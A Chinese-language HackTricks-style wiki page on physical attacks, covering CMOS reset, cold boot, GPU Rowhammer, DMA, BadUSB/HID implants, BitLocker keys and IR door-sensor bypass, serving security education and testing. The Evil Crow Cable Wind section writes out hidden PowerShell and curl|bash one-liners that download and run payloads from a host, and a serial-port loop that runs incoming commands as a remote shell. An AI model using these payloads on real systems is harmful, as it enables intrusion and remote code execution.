# 物理攻击

{{#include ../banners/hacktricks-training.md}}

## BIOS 密码恢复与系统安全

旧式 PC 固件设置可能通过断开 CMOS 电池或使用文档中说明的 clear-CMOS 跳线来重置。所需的断电时间因主板而异；现代 UEFI 密码或密钥可能存储在非易失性闪存、嵌入式控制器或安全设备中，因此即使取下电池也会保留。短接引脚前请查阅主板或维修手册；此操作也可能使 TPM 测量失效并触发磁盘加密恢复。

在旧式 x86 系统上，可以从可启动环境运行 **killCMOS** 和 **CmosPwd** 等工具，检查或修改由 CMOS 保存的设置。CmosPwd 可识别一组有文档记录的旧 BIOS 系列所使用的密码格式，并可备份、恢复或擦除/清除 CMOS 状态；其公开版本面向旧式 DOS/Windows、Linux、FreeBSD 和 NetBSD 环境。<sup>[[18]](#references)</sup> 这些实用工具并不是通用的 UEFI 密码移除工具，而且需要足够的硬件/固件访问权限。

某些笔记本电脑固件在多次密码尝试失败后会显示厂商特定的挑战码。像 [bios-pw.org](https://bios-pw.org) 这样的数据库可以为部分型号推导旧式厂商恢复密码，但许多系统采用的锁定机制并不存在可推导的挑战码。生成的密码应视为特定型号专用，并避免耗尽永久尝试次数。

### UEFI 安全性

对于现代 **UEFI** 系统，CHIPSEC 可以审计 Secure Boot 变量保护。先运行下面不会修改系统的检查；可选的 `-a modify` 模式会主动尝试破坏变量，因此只能在可恢复的实验室系统上使用。CHIPSEC 本身也警告，其特权驱动程序和底层硬件访问不适合用于生产终端。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 分析与 Cold Boot 攻击

DRAM 并不会在停止刷新后立即丢失所有位。数据衰减速率因模块技术和温度而有显著差异；与未冷却的断电重启相比，冷却可让有用数据保存更长时间。Cold-boot 攻击会快速重启到精简的采集环境，或转移冷却后的内存模块，捕获原始内存，并在位衰减的情况下重建加密密钥。磁盘复制工具不一定能映像物理内存，而 Volatility 分析的是内存转储，并不负责采集；请使用适用于目标平台且经过验证的采集工具。<sup>[[12]](#references)</sup>

---

## 针对页表的 GPU Rowhammer

当现代 GPU Rowhammer 攻击针对**GPU 虚拟内存元数据**而非普通缓冲区时，其威力会大幅提升。近期针对 **GDDR6 NVIDIA Ampere GPU** 的研究表明，攻击者可以运行非特权 CUDA 代码，构造 GPU 专用的锤击模式，通过 **memory massaging** 将分页结构放置在易受攻击的行中，然后翻转**末级页表**或中间**页目录**中的位。一旦某个地址转换条目被破坏，攻击者就能逐步获得**任意 GPU 内存读写**能力，再进一步攻击宿主机。<sup>[[1]](#references)[[2]](#references)</sup>

### 利用模式

1. **分析 GDDR6 中可锤击的行**，并构造可绕过 DRAM 内缓解措施、能感知刷新且非均匀的锤击模式。
2. **调整 GPU 分配**，促使驱动程序将地址转换结构放置在可锤击的物理位置，而不是留在默认的受保护内存池中。实际操作中，这可能包括耗尽低内存页表区域，并以可控步长大量分配稀疏的 UVM 映射。
3. **翻转地址转换元数据**，例如页表或页目录条目中的 **PFN** 或 aperture 相关位，使攻击者控制的虚拟页指向页表页、任意 GPU 内存，或宿主机可见的系统映射。
4. 重用伪造的映射来改写更多地址转换条目，从而获得跨 GPU context 的**任意 GPU 内存读写**能力。

### 宿主机攻击路径与缓解措施

- **禁用 IOMMU** 时，伪造的系统 aperture 映射可向 GPU 暴露任意**宿主机物理内存**，使 GPU 原语能够导致宿主机完全失陷。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 针对末级页表条目，而 **GeForge** 表明，破坏页目录层可能更容易，因为翻转一个位就能重定向更大的地址转换子树。不要只把某一层分页结构视为安全关键层。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然重要，因为它会阻断 GDDRHammer/GeForge 使用的直接任意宿主机内存访问路径，但它**并非完整的缓解措施**。**GPUBreach** 展示了第二阶段攻击路径：攻击者破坏由 GPU 写入、由驱动程序拥有的 CPU 缓冲区，随后触发 NVIDIA 驱动程序的内存安全漏洞，以获得内核写入原语，并在启用 IOMMU 的情况下取得 **root shell**。<sup>[[3]](#references)</sup>
- 对支持的工作站/服务器 GPU，启用**系统级 ECC** 是一种实用的加固措施。没有 ECC 的消费级 GPU 防御能力较弱。<sup>[[4]](#references)</sup>
- 这些攻击并非纯理论：**GeForge** 报告称，在 RTX 3060 上实现了 **1,171** 次位翻转，在 RTX A6000 上实现了 **202** 次，足以构建有效的宿主机权限提升攻击链。<sup>[[2]](#references)[[9]](#references)</sup>

---

## 直接内存访问 (DMA) 攻击

关于可降低预启动 IOMMU 强制执行级别并启用 Windows DMA 攻击链的离线 UEFI IFR/NVRAM 修补，请参阅：

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** 展示了通过 FireWire 和早期 Thunderbolt 配置等接口进行 **DMA 内存采集与修补**，其中包括历史上的登录绕过特征。它并非简单地“对 Windows 10 无效”：能否利用取决于接口、目标版本、IOMMU 策略、锁定状态，以及 Windows Kernel DMA Protection 是否受支持并已启用。Windows 10 version 1803 及更高版本在兼容平台上引入了 Kernel DMA Protection，大幅改变了攻击面。<sup>[[13]](#references)[[14]](#references)</sup>

---

## 使用 Live CD/USB 访问系统

对于未加密或已解锁的 Windows 卷，离线环境可以用 **cmd.exe** 替换 **sethc.exe** 或 **Utilman.exe** 等辅助功能二进制文件，从而在触发相应的登录屏幕快捷键时获得 SYSTEM 命令提示符。**chntpw** 等工具可以编辑本地 SAM 账户数据。这些方法不能绕过已锁定的 BitLocker 卷，并可能损坏受 DPAPI/EFS 保护的凭据；请保留取证副本和备份。

**Kon-Boot** 是一款适用于受支持 Windows/macOS 配置的商业启动时身份验证绕过工具。兼容性取决于操作系统、固件模式、Secure Boot 和磁盘加密配置；它不会解密已锁定的 BitLocker 卷。<sup>[[10]](#references)</sup>

---

## 处理 Windows 安全功能

### 启动与恢复快捷键

- **Delete/Supr**、F2、F10 或其他厂商按键可能会打开固件设置。
- 只有在仍启用该路径的配置中，**F8** 才能进入旧版 Windows 高级启动选项；当前进入恢复环境的方式因配置而异。
- 在某些配置中，按住 **Shift** 可以阻止 Windows 自动登录，但策略/注册表设置可能会禁用此行为。<sup>[[17]](#references)</sup>

### 恶意 USB 设备

**USB Rubber Ducky** 和 Teensy 开发板等设备可以枚举为受信任的 HID 键盘，并注入预定义按键。载荷最初拥有已登录会话的权限和桌面访问权；UAC 提示、屏幕锁定、键盘布局、时序和终端 USB 策略仍会构成限制。<sup>[[15]](#references)</sup>

可编程外设还可以攻击主机内核解析器，并协调多个 USB 设备进行堆布局操控和信息泄露：

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### 卷影副本

管理员或备份权限可用于创建卷影副本或保存注册表配置单元，以便获取 **SAM** 和 **SYSTEM** 等锁定文件。这是一种失陷后的数据收集技术，而非权限绕过；应与 `diskshadow`/VSS 和注册表配置单元导出事件进行关联分析。

## BadUSB / HID Implant 技术

### 由 NFC 触发的 Android HID gadget

只有在 USB 控制器和内核提供 **USB gadget/HID 支持**时，已 root 的 Android 手机才能变成可编程 USB 键盘。在兼容设备上，Kali NetHunter 可通过 **USB Arsenal** 提供 gadget 配置文件。另一种选择是 [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)，它可以创建 ConfigFS gadget 功能，并可能提供 `/dev/hidg0` 和 `/dev/hidg1` 等键盘/鼠标字符设备。该工具只会创建 gadget 端点；必须由单独的进程向其写入 HID reports。Root 权限无法弥补内核缺少 ConfigFS、HID gadget 支持或可用 USB Device Controller 的问题。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

此端点可以与 Android NFC 结合，作为物理触发器。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) 应用会读取标签 UID，将其转换为预期格式，检查本地白名单，并在匹配后发送已配置的 Rubber Ducky 风格键盘序列。连接的主机只会看到普通键盘输入，无需安装 NFC 软件。<sup>[[22]](#references)[[24]](#references)</sup>

在使用快捷键或命令前，请先在空白文本编辑器中验证设备枚举和键盘布局。一个无害的载荷示例如下：<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

重要的信任边界：<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID 白名单用于识别，而非认证**。UID 是公开信息，某些类型的令牌或模拟器允许克隆或冒充。复制一个获准的 UID，会走与原令牌相同的分发路径。
- **NfcScreenOff** Magisk 模块会修补 NFC 服务，使其表现得仿佛屏幕已点亮且解锁。如果手机已连接到主机，这可能让他人无需解锁手机就触发 payload。
- 存储在 payload 中的密码、API token 和命令，在已 root 或 bootloader 已解锁的设备上都可被恢复。通过 HID 输入密码属于可重复使用密码的自动化操作，并非无密码认证。
- HID 注入会以当前桌面的权限执行操作，并依赖焦点、时序和主机键盘布局。执行敏感操作前应要求用户近期确认，避免在脚本中存放特权凭据，并使用基于加密 challenge-response 的认证器实现真正的认证。

### Wi-Fi 管理型线缆植入物

- 基于 ESP32-S3 的植入物，例如 **Evil Crow Cable Wind**，可隐藏在 USB-A→USB-C 或 USB-C↔USB-C 线缆中，仅作为 USB 键盘枚举，并通过 Wi-Fi 暴露其 C2 协议栈。操作人员只需通过受害者主机为线缆供电，创建名为 `Evil Crow Cable Wind`、密码为 `123456789` 的热点，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP 地址），即可进入内置 HTTP 界面。<sup>[[8]](#references)</sup>
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 选项卡。存储的 payload 会按 OS 标记，可即时切换键盘布局，还能修改 VID/PID 字符串以仿冒已知外设。
- 由于 C2 位于线缆内部，手机无需使用组织的网络，就能预置 payload、触发执行并管理 Wi-Fi 凭据——这适用于停留时间较短的物理入侵。

### 感知 OS 的 AutoExec payload

- AutoExec 规则会将一个或多个 payload 设为在 USB 枚举后立即触发。植入物会进行轻量级 OS 指纹识别，并选择匹配的脚本。
- 示例工作流：
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）或 `CTRL ALT T`（终端）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于执行过程无人值守，只需替换一根充电线，就能在已登录用户的上下文中实现“plug-and-pwn”初始访问。

### 通过 HID 引导、经 Wi-Fi TCP 建立远程 shell

1. **按键引导：**存储的 payload 会打开控制台，并粘贴一个循环，用于执行新 USB 串行设备接收到的任何内容。一个最简 Windows 变体如下：

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **线缆桥接：** implant 在其 ESP32-S3 启动一个 TCP client（Python 脚本、Android APK 或桌面可执行文件）连接回操作人员时，会保持 USB CDC 通道打开。输入 TCP 会话的任何字节都会转发到上述串行循环中，因此即使在 air-gapped 主机上也能实现远程命令执行。输出有限，因此操作人员通常会运行盲命令（创建账户、暂存其他工具等）。

### HTTP OTA 更新面

- 文档所述的 Evil Crow Cable Wind 接口在 `/update` 暴露了一个无需身份验证的固件更新端点：<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 现场操作人员可以在交战过程中热插拔功能（例如，刷入 USB Army Knife 固件），无需打开线缆，让 implant 在仍连接到目标主机时切换到新的功能。

## 绕过 BitLocker 加密

对正在运行或最近运行过的系统进行授权取证采集时，如果卷处于解锁状态，采集内容中可能包含 BitLocker 卷主密钥或相关密钥材料。Elcomsoft Forensic Disk Decryptor 和 Passware Kit Forensic 等商业工具可以搜索受支持的内存映像、休眠文件或崩溃转储，但不能保证成功。启用 BitLocker 时，现代 Windows 也会加密崩溃转储；而存储的 48 位恢复密码与内存中的卷密钥是不同的取证对象。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 通过社会工程添加恢复密钥

攻击者若说服管理员运行 BitLocker 管理命令，就可以添加恢复密码、外部密钥或其他保护器，随后捕获该密钥。恢复密码不能是任意的全零字符串：BitLocker 数字恢复密码必须符合经过验证的 48 位格式。相关的授权管理命令语法为 `manage-bde -protectors -add C: -recoverypassword`；使用 `manage-bde -protectors -get C:` 列出添加的保护器。监控保护器添加操作，并确保新恢复材料仅托管到获批位置。<sup>[[16]](#references)</sup>

---

## 利用机箱入侵/维护开关将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都配有**机箱入侵开关**，由嵌入式控制器 (EC) 和 BIOS/UEFI 固件监控。该开关的主要用途是在设备被打开时发出警报，但某些厂商有时会实现一种**未公开的恢复快捷操作**，在开关按特定模式切换时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 开关连接到 EC 上的 **GPIO 中断**。
2. 运行于 EC 上的固件会记录**按压的时间间隔和次数**。
3. 检测到硬编码的模式后，EC 会调用 *mainboard-reset* 例程，**擦除系统 NVRAM/CMOS 的内容**。
4. 下次启动时，受影响的型号会加载重置后的固件状态。根据厂商和硬件版本，清除的状态可能包括 supervisor 密码、自定义启动设置或已注册的 Secure Boot 密钥；TPM 状态和磁盘加密影响则必须单独评估。

> 固件重置可能会恢复外部启动选项，但**不会**解密存储设备。BitLocker 或其他全盘加密系统在 TPM/固件发生变化后可能进入恢复模式，但在没有恢复密钥的情况下，内部硬盘仍受保护。<sup>[[16]](#references)</sup>

### 真实案例——Framework 13 笔记本电脑

Framework 13（第 11/12/13 代）的恢复快捷操作如下：

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

第十个周期后，EC 会设置一个标志，指示 BIOS 在下次重启时清除 NVRAM。整个过程约需 40 秒，**只需要一把螺丝刀**。<sup>[[5]](#references)</sup>

### 通用利用流程

1. 开机或从挂起状态恢复目标设备，以确保 EC 正在运行。
2. 拆下底盖，露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向分析）。
4. 重新组装并重启，然后检查哪些固件设置和凭据确实发生了变化。
5. 如果已获授权且支持外部启动，则启动受控的 live 镜像。内部卷经合法解锁后（或从未加密的情况下），live 环境可获取凭据和数据，或检查 EFI System Partition。修改该分区以安装 EFI implant 具有持久性且高度侵入性，并且仍受 Secure Boot、measured boot、固件写保护和端点监控的限制。没有密钥或恢复材料时，仍无法访问加密存储。

### 检测与缓解

* 在 OS 管理控制台中记录机箱入侵事件，并与异常 BIOS 重置事件进行关联。
* 在螺丝/外壳上使用**防篡改封条**，以检测是否被打开。
* 将设备置于**物理访问受控的区域**；应假定物理访问等同于完全失陷。
* 如果设备支持，可禁用厂商的“维护开关重置”功能，或要求额外的加密授权才能重置 NVRAM。

---

## 针对无接触出门传感器的隐蔽 IR 注入

### 传感器特性
- 常见的“挥手出门”传感器会将近红外 LED 发射器与电视遥控器式接收器模块配对；接收器只有在检测到多个（约 4–10 个）正确载波（约 30 kHz）脉冲后才会输出逻辑高电平。<sup>[[7]](#references)</sup>
- 塑料遮罩会阻止发射器与接收器直接互相照射，因此控制器会假定任何经验证的载波都来自附近的反射，并驱动继电器打开门锁。
- 控制器一旦确认目标存在，通常会改变发射调制包络，但接收器仍会接受任何符合滤波后载波条件的脉冲串。

### 攻击流程
1. **捕获发射特征**——在控制器引脚上连接逻辑分析仪，记录驱动内部 IR LED 的检测前和检测后波形。
2. **仅重放“检测后”波形**——移除/忽略原装发射器，从一开始就用外部 IR LED 发射已触发的模式。由于接收器只关心脉冲数量/频率，它会将伪造载波视为真实反射，并使继电器线路置为有效。
3. **控制发射时序**——以经过调校的脉冲串发射载波（例如，开启数十毫秒后关闭相近时长），在不使接收器的 AGC 或抗干扰逻辑饱和的情况下，提供最少所需的脉冲数。持续发射会迅速降低传感器灵敏度，导致继电器停止触发。

### 远距离反射注入
- 将实验台 LED 换成大功率 IR 二极管、MOSFET 驱动器和聚焦光学器件，即可在约 6 m 外可靠触发传感器。
- 攻击者无需与接收器开口保持视线直达；将光束瞄准玻璃可见的室内墙壁、架子或门框，让反射能量进入约 30° 的视场，就能模拟近距离挥手。
- 由于接收器预期检测到的只是微弱反射，更强的外部光束即使在多个表面上反射，仍可高于检测阈值。

### 武器化攻击手电筒
- 将驱动器嵌入商用手电筒，可让工具伪装成普通物品。将可见光 LED 换成与接收器波段匹配的大功率 IR LED，添加 ATtiny412（或类似设备）以生成约 30 kHz 脉冲，并使用 MOSFET 为 LED 提供电流回路。
- 伸缩变焦镜头可收窄光束，以提高射程/精度；由 MCU 控制的振动电机则可在不发出可见光的情况下，提供调制已启用的触觉确认。
- 循环使用几种存储的调制模式（略有不同的载波频率和包络），可提高对不同贴牌传感器系列的兼容性，让操作者扫描反射表面，直到继电器发出咔嗒声、门锁打开。

---

## References

- [1] [GDDRHammer：严重扰乱 DRAM 行——来自现代 GPU 的跨组件 Rowhammer 攻击](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge：敲击 GDDR 内存以伪造 GPU 页表，乐趣与收益兼得](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach：利用 Rowhammer 对 GPU 发起权限提升攻击](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - 安全公告：Rowhammer - 2025 年 7 月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13：按此即可 pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – 主板重置指南](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “不要碰！——使用隐蔽 IR 手电筒绕过 IR 无接触出门传感器”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “插上、运行、pwn：使用 Evil Crow Cable Wind 进行黑客攻击”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - 针对 NVIDIA 芯片的 Rowhammer 攻击](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 官方文档和兼容性信息](https://kon-boot.com/)
- [11] [CHIPSEC 文档 - Secure Boot 变量保护](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [铭记不忘：针对加密密钥的冷启动攻击](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - 通过 DMA 操纵物理内存](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky 文档](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker 操作指南](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - 按住 Shift 键与自动登录行为](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd 文档和下载](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux 文档 - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux 内核文档 - USB HID gadget 驱动程序](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [将已 Root 的 Android 手机变成 PC 的 NFC 验证器和自动化工具](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
